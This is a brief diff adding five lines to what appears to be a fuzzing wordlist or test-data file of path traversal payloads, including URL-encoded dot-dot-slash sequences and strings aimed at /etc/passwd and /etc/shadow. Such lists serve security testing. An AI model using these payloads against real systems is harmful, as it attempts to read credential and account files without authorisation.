@@ -1,0 +1,5 @@
+%2e%2e%2f%2e%2e%2e
+%ff
+%2e%2e
+../../../../etc/passwd
+../../../../etc/shadow
